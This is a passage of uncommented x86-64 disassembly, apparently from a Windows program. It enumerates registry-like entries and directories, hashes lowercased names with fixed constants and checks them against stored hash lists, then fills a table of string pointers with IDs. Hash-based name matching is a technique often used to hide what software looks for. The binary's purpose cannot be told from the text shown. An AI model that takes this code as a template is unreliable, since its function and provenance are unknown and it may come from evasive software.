   14003e5f0:	mov    QWORD PTR [rbp+0x1158],rdx
   14003e5f7:	cmp    rbx,0x3
   14003e5fb:	je     0x14003e839
   14003e601:	mov    rcx,QWORD PTR [rax+0x38]
   14003e605:	cmp    rcx,0x1
   14003e609:	ja     0x140048122
   14003e60f:	shl    rcx,0x4
   14003e613:	add    rax,0x28
   14003e617:	inc    rbx
   14003e61a:	cmp    BYTE PTR [rbp+rcx*1+0xf80],0x0
   14003e622:	je     0x14003e5f7
   14003e624:	add    rcx,rbp
   14003e627:	add    rcx,0xf80
   14003e62e:	mov    rdx,QWORD PTR [rax]
   14003e631:	mov    QWORD PTR [rbp+0x1170],rdx
   14003e638:	mov    r12,QWORD PTR [rax+0x8]
   14003e63c:	mov    rdx,QWORD PTR [rax+0x18]
   14003e640:	mov    QWORD PTR [rbp+0x1178],rdx
   14003e647:	mov    rsi,QWORD PTR [rax+0x20]
   14003e64b:	mov    rdx,QWORD PTR [rcx+0x8]
   14003e64f:	xor    r14d,r14d
   14003e652:	xor    eax,eax
   14003e654:	push   0x40
   14003e656:	pop    rcx
   14003e657:	lea    rdi,[rbp+0x7d0]
   14003e65e:	rep stos DWORD PTR [rdi],eax
   14003e660:	mov    QWORD PTR [rbp+0x1168],rdx
   14003e667:	mov    rdi,rdx
   14003e66a:	xor    r15d,r15d
   14003e66d:	mov    DWORD PTR [rbp+0x610],0x100
   14003e677:	mov    rcx,rdi
   14003e67a:	mov    edx,r14d
   14003e67d:	lea    r8,[rbp+0x7d0]
   14003e684:	lea    r9,[rbp+0x610]
   14003e68b:	call   0x1400648b1
   14003e690:	cmp    eax,0xea
   14003e695:	je     0x14003e7dd
   14003e69b:	test   eax,eax
   14003e69d:	jne    0x14003e7e5
   14003e6a3:	mov    eax,DWORD PTR [rbp+0x610]
   14003e6a9:	cmp    eax,0x101
   14003e6ae:	lea    rdx,[rbp+0x7d0]
   14003e6b5:	push   0x1
   14003e6b7:	pop    rcx
   14003e6b8:	cmovae rdx,rcx
   14003e6bc:	mov    ecx,0x0
   14003e6c1:	cmovae eax,ecx
   14003e6c4:	xor    r8d,r8d
   14003e6c7:	movabs rcx,0xe49e47b70d5eafc7
   14003e6d1:	cmp    rax,r8
   14003e6d4:	je     0x14003e702
   14003e6d6:	movzx  r9d,BYTE PTR [rdx+r8*1]
   14003e6db:	lea    r10d,[r9-0x41]
   14003e6df:	mov    r11d,r9d
   14003e6e2:	or     r9d,0x20
   14003e6e6:	cmp    r10b,0x1a
   14003e6ea:	cmovae r9d,r11d
   14003e6ee:	movzx  r9d,r9w
   14003e6f2:	xor    rcx,r9
   14003e6f5:	imul   rcx,r13
   14003e6f9:	rol    rcx,0x21
   14003e6fd:	inc    r8
   14003e700:	jmp    0x14003e6d1
   14003e702:	movabs rax,0xe49e47b70d5eafc7
   14003e70c:	xor    rcx,rax
   14003e70f:	movabs rax,0x406aa9c82dbf9701
   14003e719:	imul   rcx,rax
   14003e71d:	mov    rdx,rcx
   14003e720:	shr    rdx,0x1d
   14003e724:	xor    rdx,rcx
   14003e727:	movabs rax,0xeb591050d1f713a9
   14003e731:	imul   rdx,rax
   14003e735:	mov    rax,rdx
   14003e738:	shr    rax,0x20
   14003e73c:	xor    rax,rdx
   14003e73f:	cmp    r15,r12
   14003e742:	mov    rcx,QWORD PTR [rbp+0x1170]
   14003e749:	lea    rcx,[rcx+r15*8]
   14003e74d:	mov    rdx,rsi
   14003e750:	push   0x1
   14003e752:	pop    r8
   14003e754:	cmovb  rdx,r8
   14003e758:	cmovae rcx,QWORD PTR [rbp+0x1178]
   14003e760:	xor    r9d,r9d
   14003e763:	xor    r8d,r8d
   14003e766:	cmp    rdx,r9
   14003e769:	je     0x14003e77c
   14003e76b:	cmp    QWORD PTR [rcx+r9*8],rax
   14003e76f:	lea    r9,[r9+0x1]
   14003e773:	sete   r10b
   14003e777:	or     r8b,r10b
   14003e77a:	jmp    0x14003e766
   14003e77c:	test   r8b,0x1
   14003e780:	je     0x14003e7dd
   14003e782:	cmp    r15,r12
   14003e785:	je     0x14003e7e9
   14003e787:	and    QWORD PTR [rbp+0x640],0x0
   14003e78f:	mov    rcx,rdi
   14003e792:	lea    rdx,[rbp+0x7d0]
   14003e799:	lea    r8,[rbp+0x640]
   14003e7a0:	call   0x14006490c
   14003e7a5:	mov    r14d,eax
   14003e7a8:	mov    r13,QWORD PTR [rbp+0x640]
   14003e7af:	cmp    rdi,QWORD PTR [rbp+0x1168]
   14003e7b6:	je     0x14003e7c0
   14003e7b8:	mov    rcx,rdi
   14003e7bb:	call   0x140064781
   14003e7c0:	test   r14d,r14d
   14003e7c3:	jne    0x14003e80d
   14003e7c5:	inc    r15
   14003e7c8:	xor    r14d,r14d
   14003e7cb:	mov    rdi,r13
   14003e7ce:	movabs r13,0xf78a05c12bafb8cf
   14003e7d8:	jmp    0x14003e66d
   14003e7dd:	inc    r14d
   14003e7e0:	jmp    0x14003e66d
   14003e7e5:	xor    esi,esi
   14003e7e7:	jmp    0x14003e7ec
   14003e7e9:	mov    sil,0x1
   14003e7ec:	cmp    rdi,QWORD PTR [rbp+0x1168]
   14003e7f3:	movabs r12,0xeb591050d1f713a9
   14003e7fd:	push   0x2
   14003e7ff:	pop    r14
   14003e801:	je     0x14003e827
   14003e803:	mov    rcx,rdi
   14003e806:	call   0x140064781
   14003e80b:	jmp    0x14003e827
   14003e80d:	xor    esi,esi
   14003e80f:	movabs r12,0xeb591050d1f713a9
   14003e819:	movabs r13,0xf78a05c12bafb8cf
   14003e823:	push   0x2
   14003e825:	pop    r14
   14003e827:	or     sil,BYTE PTR [rbp+0x1158]
   14003e82e:	and    sil,0x1
   14003e832:	mov    edx,esi
   14003e834:	jmp    0x14003e5e2
   14003e839:	xor    esi,esi
   14003e83b:	lea    r13,[rbp+0x7d0]
   14003e842:	cmp    rsi,0x20
   14003e846:	je     0x14003e865
   14003e848:	cmp    DWORD PTR [rbp+rsi*1+0xf80],0x1
   14003e850:	jne    0x14003e85f
   14003e852:	mov    rcx,QWORD PTR [rbp+rsi*1+0xf88]
   14003e85a:	call   0x140064781
   14003e85f:	add    rsi,0x10
   14003e863:	jmp    0x14003e842
   14003e865:	mov    rcx,QWORD PTR [rbp+0x400]
   14003e86c:	mov    rdx,QWORD PTR [rbp+0x7c0]
   14003e873:	call   0x14006f7f7
   14003e878:	mov    rcx,QWORD PTR [rbp+0x290]
   14003e87f:	mov    rdx,QWORD PTR [rbp+0x1140]
   14003e886:	call   0x14006f7f7
   14003e88b:	lea    rcx,[rbp+0xf80]
   14003e892:	call   0x140064dbd
   14003e897:	xor    eax,eax
   14003e899:	cmp    rax,QWORD PTR [rbp+0xf80]
   14003e8a0:	mov    ebx,0x0
   14003e8a5:	push   0x1
   14003e8a7:	pop    r15
   14003e8a9:	mov    esi,0x0
   14003e8ae:	jo     0x14003e945
   14003e8b4:	mov    rax,QWORD PTR [rbp+0xf90]
   14003e8bb:	mov    QWORD PTR [rbp+0x620],rax
   14003e8c2:	movups xmm0,XMMWORD PTR [rbp+0xf80]
   14003e8c9:	movaps XMMWORD PTR [rbp+0x610],xmm0
   14003e8d0:	lea    rax,[rip+0x5f752]        # 0x14009e029
   14003e8d7:	mov    QWORD PTR [rbp+0x7d0],rax
   14003e8de:	mov    QWORD PTR [rbp+0x7d8],0x8
   14003e8e9:	mov    eax,0xc4400021
   14003e8ee:	mov    QWORD PTR [rbp+0x7e0],rax
   14003e8f5:	lea    rcx,[rbp+0xd10]
   14003e8fc:	mov    rdx,r13
   14003e8ff:	call   0x140063a6d
   14003e904:	mov    rdi,QWORD PTR [rbp+0xd18]
   14003e90b:	mov    r8,QWORD PTR [rbp+0xd20]
   14003e912:	lea    rcx,[rbp+0x610]
   14003e919:	mov    rdx,rdi
   14003e91c:	call   0x140063f0e
   14003e921:	mov    rbx,QWORD PTR [rbp+0x610]
   14003e928:	mov    r15,QWORD PTR [rbp+0x618]
   14003e92f:	mov    rsi,QWORD PTR [rbp+0x620]
   14003e936:	mov    rcx,QWORD PTR [rbp+0xd10]
   14003e93d:	mov    rdx,rdi
   14003e940:	call   0x14006f7f7
   14003e945:	lea    rax,[rip+0x49934]        # 0x140088280
   14003e94c:	mov    QWORD PTR [rbp+0x290],rax
   14003e953:	push   0xc
   14003e955:	pop    rcx
   14003e956:	mov    QWORD PTR [rbp+0x298],rcx
   14003e95d:	lea    rax,[rip+0x49928]        # 0x14008828c
   14003e964:	mov    QWORD PTR [rbp+0x2a0],rax
   14003e96b:	mov    QWORD PTR [rbp+0x2a8],rcx
   14003e972:	lea    rdi,[rbp+0xd10]
   14003e979:	mov    rcx,rdi
   14003e97c:	lea    rdx,[rbp+0x290]
   14003e983:	call   0x14003bc2c
   14003e988:	mov    rcx,r13
   14003e98b:	mov    rdx,rdi
   14003e98e:	call   0x14003bac6
   14003e993:	lea    rcx,[rbp+0x640]
   14003e99a:	mov    rdx,r13
   14003e99d:	call   0x14003c0c9
   14003e9a2:	add    rsi,r15
   14003e9a5:	mov    QWORD PTR [rbp+0x7d0],r15
   14003e9ac:	mov    QWORD PTR [rbp+0x7d8],rsi
   14003e9b3:	and    WORD PTR [rbp+0x7e0],0x0
   14003e9bb:	lea    rcx,[rbp+0x400]
   14003e9c2:	mov    rdx,r13
   14003e9c5:	call   0x14003bf24
   14003e9ca:	mov    rdi,QWORD PTR [rbp+0x648]
   14003e9d1:	mov    rax,QWORD PTR [rbp+0x650]
   14003e9d8:	add    rax,rdi
   14003e9db:	mov    QWORD PTR [rbp+0x7d0],rdi
   14003e9e2:	mov    QWORD PTR [rbp+0x7d8],rax
   14003e9e9:	and    WORD PTR [rbp+0x7e0],0x0
   14003e9f1:	lea    rcx,[rbp+0x418]
   14003e9f8:	mov    rdx,r13
   14003e9fb:	call   0x14003bf24
   14003ea00:	mov    QWORD PTR [rbp+0xf80],0x8
   14003ea0b:	lea    rax,[rbp+0xf88]
   14003ea12:	movups XMMWORD PTR [rax],xmm6
   14003ea15:	lea    rax,[rip+0x498ac]        # 0x1400882c8
   14003ea1c:	mov    QWORD PTR [rbp+0xf98],rax
   14003ea23:	mov    QWORD PTR [rbp+0xfa0],0x5
   14003ea2e:	lea    rax,[rip+0x49863]        # 0x140088298
   14003ea35:	mov    QWORD PTR [rbp+0xfa8],rax
   14003ea3c:	mov    QWORD PTR [rbp+0xfb0],r14
   14003ea43:	push   0x1
   14003ea45:	pop    rcx
   14003ea46:	mov    QWORD PTR [rbp+0xfb8],rcx
   14003ea4d:	lea    rax,[rip+0x49854]        # 0x1400882a8
   14003ea54:	mov    QWORD PTR [rbp+0xfc0],rax
   14003ea5b:	mov    QWORD PTR [rbp+0xfc8],rcx
   14003ea62:	lea    rax,[rip+0x49847]        # 0x1400882b0
   14003ea69:	mov    QWORD PTR [rbp+0xfd0],rax
   14003ea70:	mov    QWORD PTR [rbp+0xfd8],r14
   14003ea77:	mov    QWORD PTR [rbp+0xfe0],rcx
   14003ea7e:	lea    rax,[rip+0x4983b]        # 0x1400882c0
   14003ea85:	mov    QWORD PTR [rbp+0xfe8],rax
   14003ea8c:	mov    QWORD PTR [rbp+0xff0],rcx
   14003ea93:	xor    esi,esi
   14003ea95:	mov    QWORD PTR [rbp+0x1168],0x0
   14003eaa0:	imul   rax,rsi,0x28
   14003eaa4:	lea    rcx,[rbp+0xf58]
   14003eaab:	add    rax,rcx
   14003eaae:	cmp    rsi,0x3
   14003eab2:	je     0x14003eddd
   14003eab8:	mov    rcx,QWORD PTR [rax+0x38]
   14003eabc:	cmp    rcx,0x1
   14003eac0:	ja     0x14004812b
   14003eac6:	imul   rcx,rcx,0x18
   14003eaca:	mov    r14,QWORD PTR [rbp+rcx*1+0x410]
   14003ead2:	add    rax,0x28
   14003ead6:	inc    rsi
   14003ead9:	test   r14,r14
   14003eadc:	je     0x14003eaae
   14003eade:	mov    QWORD PTR [rbp+0x1140],rdi
   14003eae5:	add    rcx,rbp
   14003eae8:	add    rcx,0x400
   14003eaef:	mov    rdx,QWORD PTR [rax]
   14003eaf2:	mov    QWORD PTR [rbp+0x7c0],rdx
   14003eaf9:	mov    rdx,QWORD PTR [rax+0x8]
   14003eafd:	mov    QWORD PTR [rbp+0x1170],rdx
   14003eb04:	mov    rdx,QWORD PTR [rax+0x18]
   14003eb08:	mov    QWORD PTR [rbp+0x5d8],rdx
   14003eb0f:	mov    rax,QWORD PTR [rax+0x20]
   14003eb13:	mov    QWORD PTR [rbp+0x700],rax
   14003eb1a:	mov    rdx,QWORD PTR [rcx+0x8]
   14003eb1e:	mov    ecx,0x410
   14003eb23:	xor    eax,eax
   14003eb25:	mov    rdi,r13
   14003eb28:	rep stos BYTE PTR [rdi],al
   14003eb2a:	cmp    r14,0x104
   14003eb31:	ja     0x14003ed94
   14003eb37:	xor    eax,eax
   14003eb39:	cmp    r14,rax
   14003eb3c:	je     0x14003eb4f
   14003eb3e:	movzx  ecx,WORD PTR [rdx+rax*2]
   14003eb42:	mov    WORD PTR [rbp+rax*2+0x7d0],cx
   14003eb4a:	inc    rax
   14003eb4d:	jmp    0x14003eb39
   14003eb4f:	mov    QWORD PTR [rbp+0x798],rbx
   14003eb56:	mov    QWORD PTR [rbp+0x1178],0x0
   14003eb61:	mov    QWORD PTR [rbp+0x698],r15
   14003eb68:	mov    WORD PTR [rbp+r14*2+0x7d0],0x5c
   14003eb73:	mov    WORD PTR [rbp+r14*2+0x7d2],0x2a
   14003eb7e:	and    WORD PTR [rbp+r14*2+0x7d4],0x0
   14003eb88:	xor    ebx,ebx
   14003eb8a:	mov    ecx,0x250
   14003eb8f:	xor    eax,eax
   14003eb91:	lea    rdx,[rbp+0xd10]
   14003eb98:	mov    rdi,rdx
   14003eb9b:	rep stos BYTE PTR [rdi],al
   14003eb9d:	mov    rcx,r13
   14003eba0:	call   0x140065aba
   14003eba5:	mov    rdi,rax
   14003eba8:	dec    rax
   14003ebab:	cmp    rax,0xfffffffffffffffd
   14003ebaf:	ja     0x14003edc5
   14003ebb5:	lea    rax,[r14*2+0x7d2]
   14003ebbd:	add    rax,rbp
   14003ebc0:	mov    QWORD PTR [rbp+0x5e0],rax
   14003ebc7:	inc    r14
   14003ebca:	mov    rcx,QWORD PTR [rbp+0x1178]
   14003ebd1:	cmp    rcx,QWORD PTR [rbp+0x1170]
   14003ebd8:	mov    r15,QWORD PTR [rbp+0x700]
   14003ebdf:	push   0x1
   14003ebe1:	pop    rax
   14003ebe2:	cmovb  r15,rax
   14003ebe6:	mov    rax,QWORD PTR [rbp+0x7c0]
   14003ebed:	lea    r12,[rax+rcx*8]
   14003ebf1:	cmovae r12,QWORD PTR [rbp+0x5d8]
   14003ebf9:	xor    ebx,ebx
   14003ebfb:	mov    r13d,0x104
   14003ec01:	lea    rax,[rbp+0xd3c]
   14003ec08:	mov    edx,0x104
   14003ec0d:	cmp    rbx,0x104
   14003ec14:	je     0x14003ec3f
   14003ec16:	cmp    WORD PTR [rbp+rbx*2+0xd3c],0x0
   14003ec1f:	je     0x14003ec26
   14003ec21:	inc    rbx
   14003ec24:	jmp    0x14003ebfb
   14003ec26:	lea    rcx,[rbp+0xd3c]
   14003ec2d:	mov    rdx,rbx
   14003ec30:	lea    r8,[rip+0x49719]        # 0x140088350
   14003ec37:	call   0x14003c091
   14003ec3c:	mov    r13,rbx
   14003ec3f:	xor    r8d,r8d
   14003ec42:	movabs rcx,0xe49e47b70d5eafc7
   14003ec4c:	cmp    rdx,r8
   14003ec4f:	je     0x14003ec88
   14003ec51:	movzx  r9d,WORD PTR [rax+r8*2]
   14003ec56:	inc    r8
   14003ec59:	lea    r10d,[r9-0x41]
   14003ec5d:	mov    r11d,r9d
   14003ec60:	or     r11d,0x20
   14003ec64:	cmp    r10w,0x1a
   14003ec69:	cmovae r11d,r9d
   14003ec6d:	movzx  r9d,r11w
   14003ec71:	xor    rcx,r9
   14003ec74:	movabs r9,0xf78a05c12bafb8cf
   14003ec7e:	imul   rcx,r9
   14003ec82:	rol    rcx,0x21
   14003ec86:	jmp    0x14003ec4c
   14003ec88:	movabs rax,0xe49e47b70d5eafc7
   14003ec92:	xor    rcx,rax
   14003ec95:	movabs rax,0x406aa9c82dbf9701
   14003ec9f:	imul   rcx,rax
   14003eca3:	mov    rdx,rcx
   14003eca6:	shr    rdx,0x1d
   14003ecaa:	xor    rdx,rcx
   14003ecad:	movabs rax,0xeb591050d1f713a9
   14003ecb7:	imul   rdx,rax
   14003ecbb:	mov    rax,rdx
   14003ecbe:	shr    rax,0x20
   14003ecc2:	xor    rax,rdx
   14003ecc5:	xor    edx,edx
   14003ecc7:	xor    ecx,ecx
   14003ecc9:	cmp    r15,rdx
   14003eccc:	je     0x14003ecdf
   14003ecce:	cmp    QWORD PTR [r12+rdx*8],rax
   14003ecd2:	lea    rdx,[rdx+0x1]
   14003ecd6:	sete   r8b
   14003ecda:	or     cl,r8b
   14003ecdd:	jmp    0x14003ecc9
   14003ecdf:	test   cl,0x1
   14003ece2:	jne    0x14003ed02
   14003ece4:	mov    rcx,rdi
   14003ece7:	lea    rdx,[rbp+0xd10]
   14003ecee:	call   0x14006483c
   14003ecf3:	mov    ebx,0x0
   14003ecf8:	test   eax,eax
   14003ecfa:	jne    0x14003ebfb
   14003ed00:	jmp    0x14003ed6d
   14003ed02:	mov    rcx,rdi
   14003ed05:	call   0x14006622c
   14003ed0a:	mov    rax,QWORD PTR [rbp+0x1178]
   14003ed11:	cmp    rax,QWORD PTR [rbp+0x1170]
   14003ed18:	je     0x14003eda0
   14003ed1e:	add    r14,r13
   14003ed21:	cmp    r14,0x205
   14003ed28:	movabs r12,0xeb591050d1f713a9
   14003ed32:	mov    r15,QWORD PTR [rbp+0x698]
   14003ed39:	mov    rdx,QWORD PTR [rbp+0x5e0]
   14003ed40:	ja     0x14003edbc
   14003ed42:	xor    eax,eax
   14003ed44:	cmp    r13,rax
   14003ed47:	je     0x14003ed5a
   14003ed49:	movzx  ecx,WORD PTR [rbp+rax*2+0xd3c]
   14003ed51:	mov    WORD PTR [rdx+rax*2],cx
   14003ed55:	inc    rax
   14003ed58:	jmp    0x14003ed44
   14003ed5a:	inc    QWORD PTR [rbp+0x1178]
   14003ed61:	lea    r13,[rbp+0x7d0]
   14003ed68:	jmp    0x14003eb68
   14003ed6d:	mov    rcx,rdi
   14003ed70:	call   0x14006622c
   14003ed75:	movabs r12,0xeb591050d1f713a9
   14003ed7f:	lea    r13,[rbp+0x7d0]
   14003ed86:	mov    rbx,QWORD PTR [rbp+0x798]
   14003ed8d:	mov    r15,QWORD PTR [rbp+0x698]
   14003ed94:	mov    rdi,QWORD PTR [rbp+0x1140]
   14003ed9b:	jmp    0x14003eaa0
   14003eda0:	mov    bl,0x1
   14003eda2:	movabs r12,0xeb591050d1f713a9
   14003edac:	lea    r13,[rbp+0x7d0]
   14003edb3:	mov    r15,QWORD PTR [rbp+0x698]
   14003edba:	jmp    0x14003edc5
   14003edbc:	xor    ebx,ebx
   14003edbe:	lea    r13,[rbp+0x7d0]
   14003edc5:	or     bl,BYTE PTR [rbp+0x1168]
   14003edcb:	mov    eax,ebx
   14003edcd:	mov    QWORD PTR [rbp+0x1168],rax
   14003edd4:	mov    rbx,QWORD PTR [rbp+0x798]
   14003eddb:	jmp    0x14003ed94
   14003eddd:	lea    rcx,[rbp+0x400]
   14003ede4:	call   0x14003bd35
   14003ede9:	mov    rcx,QWORD PTR [rbp+0x640]
   14003edf0:	mov    rdx,rdi
   14003edf3:	call   0x14006f7f7
   14003edf8:	mov    rcx,rbx
   14003edfb:	mov    rdx,r15
   14003edfe:	call   0x14006f7f7
   14003ee03:	lea    rax,[rip+0x5f361]        # 0x14009e16b
   14003ee0a:	mov    QWORD PTR [rbp+0x7d0],rax
   14003ee11:	push   0xa
   14003ee13:	pop    rax
   14003ee14:	mov    QWORD PTR [rbp+0x7d8],rax
   14003ee1b:	mov    ecx,0xc680000d
   14003ee20:	mov    QWORD PTR [rbp+0x7e0],rcx
   14003ee27:	lea    rcx,[rip+0x5f2c7]        # 0x14009e0f5
   14003ee2e:	mov    QWORD PTR [rbp+0x7e8],rcx
   14003ee35:	mov    QWORD PTR [rbp+0x7f0],rax
   14003ee3c:	mov    ecx,0xc690000d
   14003ee41:	mov    QWORD PTR [rbp+0x7f8],rcx
   14003ee48:	lea    rcx,[rip+0x5f2ce]        # 0x14009e11d
   14003ee4f:	mov    QWORD PTR [rbp+0x800],rcx
   14003ee56:	push   0xb
   14003ee58:	pop    rcx
   14003ee59:	mov    QWORD PTR [rbp+0x808],rcx
   14003ee60:	mov    edx,0xc6a0000d
   14003ee65:	mov    QWORD PTR [rbp+0x810],rdx
   14003ee6c:	lea    rdx,[rip+0x5f28c]        # 0x14009e0ff
   14003ee73:	mov    QWORD PTR [rbp+0x818],rdx
   14003ee7a:	push   0x7
   14003ee7c:	pop    rdx
   14003ee7d:	mov    QWORD PTR [rbp+0x820],rdx
   14003ee84:	mov    r8d,0xc6b0000d
   14003ee8a:	mov    QWORD PTR [rbp+0x828],r8
   14003ee91:	lea    r8,[rip+0x5f290]        # 0x14009e128
   14003ee98:	mov    QWORD PTR [rbp+0x830],r8
   14003ee9f:	push   0x9
   14003eea1:	pop    r8
   14003eea3:	mov    QWORD PTR [rbp+0x838],r8
   14003eeaa:	mov    r9d,0xc6c0000d
   14003eeb0:	mov    QWORD PTR [rbp+0x840],r9
   14003eeb7:	lea    r9,[rip+0x5f27e]        # 0x14009e13c
   14003eebe:	mov    QWORD PTR [rbp+0x848],r9
   14003eec5:	mov    QWORD PTR [rbp+0x850],0x8
   14003eed0:	mov    r9d,0xc6d0000d
   14003eed6:	mov    QWORD PTR [rbp+0x858],r9
   14003eedd:	lea    r9,[rip+0x5f1ed]        # 0x14009e0d1
   14003eee4:	mov    QWORD PTR [rbp+0x860],r9
   14003eeeb:	mov    QWORD PTR [rbp+0x868],rax
   14003eef2:	mov    r9d,0xc6e0000d
   14003eef8:	mov    QWORD PTR [rbp+0x870],r9
   14003eeff:	lea    r9,[rip+0x5f28e]        # 0x14009e194
   14003ef06:	mov    QWORD PTR [rbp+0x878],r9
   14003ef0d:	mov    QWORD PTR [rbp+0x880],rax
   14003ef14:	mov    r9d,0xc6f0000d
   14003ef1a:	mov    QWORD PTR [rbp+0x888],r9
   14003ef21:	lea    r9,[rip+0x5f276]        # 0x14009e19e
   14003ef28:	mov    QWORD PTR [rbp+0x890],r9
   14003ef2f:	mov    QWORD PTR [rbp+0x898],0x6
   14003ef3a:	mov    r9d,0xc700000d
   14003ef40:	mov    QWORD PTR [rbp+0x8a0],r9
   14003ef47:	lea    r9,[rip+0x5f151]        # 0x14009e09f
   14003ef4e:	mov    QWORD PTR [rbp+0x8a8],r9
   14003ef55:	mov    QWORD PTR [rbp+0x8b0],rdx
   14003ef5c:	mov    r9d,0xc710000d
   14003ef62:	mov    QWORD PTR [rbp+0x8b8],r9
   14003ef69:	lea    r9,[rip+0x5f174]        # 0x14009e0e4
   14003ef70:	mov    QWORD PTR [rbp+0x8c0],r9
   14003ef77:	mov    QWORD PTR [rbp+0x8c8],0x11
   14003ef82:	mov    r9d,0xc720000d
   14003ef88:	mov    QWORD PTR [rbp+0x8d0],r9
   14003ef8f:	lea    r9,[rip+0x5f1b9]        # 0x14009e14f
   14003ef96:	mov    QWORD PTR [rbp+0x8d8],r9
   14003ef9d:	mov    QWORD PTR [rbp+0x8e0],0x12
   14003efa8:	mov    r9d,0xc730000d
   14003efae:	mov    QWORD PTR [rbp+0x8e8],r9
   14003efb5:	lea    r9,[rip+0x5f175]        # 0x14009e131
   14003efbc:	mov    QWORD PTR [rbp+0x8f0],r9
   14003efc3:	mov    QWORD PTR [rbp+0x8f8],rcx
   14003efca:	mov    r9d,0xc740000d
   14003efd0:	mov    QWORD PTR [rbp+0x900],r9
   14003efd7:	lea    r9,[rip+0x5f0cf]        # 0x14009e0ad
   14003efde:	mov    QWORD PTR [rbp+0x908],r9
   14003efe5:	push   0xd
   14003efe7:	pop    r9
   14003efe9:	mov    QWORD PTR [rbp+0x910],r9
   14003eff0:	mov    r10d,0xc750000d
   14003eff6:	mov    QWORD PTR [rbp+0x918],r10
   14003effd:	lea    r10,[rip+0x5f06b]        # 0x14009e06f
   14003f004:	mov    QWORD PTR [rbp+0x920],r10
   14003f00b:	mov    QWORD PTR [rbp+0x928],rcx
   14003f012:	mov    r10d,0xc760000d
   14003f018:	mov    QWORD PTR [rbp+0x930],r10
   14003f01f:	lea    r10,[rip+0x5f0e0]        # 0x14009e106
   14003f026:	mov    QWORD PTR [rbp+0x938],r10
   14003f02d:	mov    QWORD PTR [rbp+0x940],r9
   14003f034:	mov    r10d,0xc770000d
   14003f03a:	mov    QWORD PTR [rbp+0x948],r10
   14003f041:	lea    r10,[rip+0x5f01a]        # 0x14009e062
   14003f048:	mov    QWORD PTR [rbp+0x950],r10
   14003f04f:	mov    QWORD PTR [rbp+0x958],r9
   14003f056:	mov    r10d,0xc780000d
   14003f05c:	mov    QWORD PTR [rbp+0x960],r10
   14003f063:	lea    r10,[rip+0x5f0da]        # 0x14009e144
   14003f06a:	mov    QWORD PTR [rbp+0x968],r10
   14003f071:	mov    QWORD PTR [rbp+0x970],rcx
   14003f078:	mov    r10d,0xc790000d
   14003f07e:	mov    QWORD PTR [rbp+0x978],r10
   14003f085:	lea    r10,[rip+0x5f118]        # 0x14009e1a4
   14003f08c:	mov    QWORD PTR [rbp+0x980],r10
   14003f093:	mov    QWORD PTR [rbp+0x988],r8
   14003f09a:	mov    r10d,0xc7a0000d
   14003f0a0:	mov    QWORD PTR [rbp+0x990],r10
   14003f0a7:	lea    r10,[rip+0x5efa1]        # 0x14009e04f
   14003f0ae:	mov    QWORD PTR [rbp+0x998],r10
   14003f0b5:	push   0xc
   14003f0b7:	pop    r11
   14003f0b9:	mov    QWORD PTR [rbp+0x9a0],r11
   14003f0c0:	mov    r10d,0xc7b0000d
   14003f0c6:	mov    QWORD PTR [rbp+0x9a8],r10
   14003f0cd:	lea    r10,[rip+0x5eff3]        # 0x14009e0c7
   14003f0d4:	mov    QWORD PTR [rbp+0x9b0],r10
   14003f0db:	mov    QWORD PTR [rbp+0x9b8],rax
   14003f0e2:	mov    r10d,0xc7c0000d
   14003f0e8:	mov    QWORD PTR [rbp+0x9c0],r10
   14003f0ef:	lea    r10,[rip+0x5ef9b]        # 0x14009e091
   14003f0f6:	mov    QWORD PTR [rbp+0x9c8],r10
   14003f0fd:	mov    QWORD PTR [rbp+0x9d0],0xe
   14003f108:	mov    r10d,0xc7d0000d
   14003f10e:	mov    QWORD PTR [rbp+0x9d8],r10
   14003f115:	lea    r10,[rip+0x5ef8a]        # 0x14009e0a6
   14003f11c:	mov    QWORD PTR [rbp+0x9e0],r10
   14003f123:	mov    QWORD PTR [rbp+0x9e8],rdx
   14003f12a:	mov    r10d,0xc7e0000d
   14003f130:	mov    QWORD PTR [rbp+0x9f0],r10
   14003f137:	lea    r10,[rip+0x5eefe]        # 0x14009e03c
   14003f13e:	mov    QWORD PTR [rbp+0x9f8],r10
   14003f145:	mov    QWORD PTR [rbp+0xa00],0x13
   14003f150:	mov    r10d,0xc7f0000d
   14003f156:	mov    QWORD PTR [rbp+0xa08],r10
   14003f15d:	lea    r10,[rip+0x5eecd]        # 0x14009e031
   14003f164:	mov    QWORD PTR [rbp+0xa10],r10
   14003f16b:	mov    QWORD PTR [rbp+0xa18],rcx
   14003f172:	mov    r10d,0xc800000d
   14003f178:	mov    QWORD PTR [rbp+0xa20],r10
   14003f17f:	lea    r10,[rip+0x5ef34]        # 0x14009e0ba
   14003f186:	mov    QWORD PTR [rbp+0xa28],r10
   14003f18d:	mov    QWORD PTR [rbp+0xa30],r9
   14003f194:	mov    r9d,0xc810000d
   14003f19a:	mov    QWORD PTR [rbp+0xa38],r9
   14003f1a1:	lea    r9,[rip+0x5ef6b]        # 0x14009e113
   14003f1a8:	mov    QWORD PTR [rbp+0xa40],r9
   14003f1af:	mov    QWORD PTR [rbp+0xa48],rax
   14003f1b6:	mov    r9d,0xc820000d
   14003f1bc:	mov    QWORD PTR [rbp+0xa50],r9
   14003f1c3:	lea    r9,[rip+0x5efab]        # 0x14009e175
   14003f1ca:	mov    QWORD PTR [rbp+0xa58],r9
   14003f1d1:	mov    QWORD PTR [rbp+0xa60],rcx
   14003f1d8:	mov    r9d,0xc830000d
   14003f1de:	mov    QWORD PTR [rbp+0xa68],r9
   14003f1e5:	lea    r9,[rip+0x5ee99]        # 0x14009e085
   14003f1ec:	mov    QWORD PTR [rbp+0xa70],r9
   14003f1f3:	mov    QWORD PTR [rbp+0xa78],r11
   14003f1fa:	mov    r9d,0xc840000d
   14003f200:	mov    QWORD PTR [rbp+0xa80],r9
   14003f207:	lea    r9,[rip+0x5ee6c]        # 0x14009e07a
   14003f20e:	mov    QWORD PTR [rbp+0xa88],r9
   14003f215:	mov    QWORD PTR [rbp+0xa90],rcx
   14003f21c:	mov    ecx,0xc850000d
   14003f221:	mov    QWORD PTR [rbp+0xa98],rcx
   14003f228:	lea    rcx,[rip+0x5ef32]        # 0x14009e161
   14003f22f:	mov    QWORD PTR [rbp+0xaa0],rcx
   14003f236:	mov    QWORD PTR [rbp+0xaa8],rax
   14003f23d:	mov    eax,0xc860000d
   14003f242:	mov    QWORD PTR [rbp+0xab0],rax
   14003f249:	lea    rax,[rip+0x5ef30]        # 0x14009e180
   14003f250:	mov    QWORD PTR [rbp+0xab8],rax
   14003f257:	mov    QWORD PTR [rbp+0xac0],0x14
   14003f262:	mov    eax,0xc870000d
   14003f267:	mov    QWORD PTR [rbp+0xac8],rax
   14003f26e:	lea    rax,[rip+0x5ee66]        # 0x14009e0db
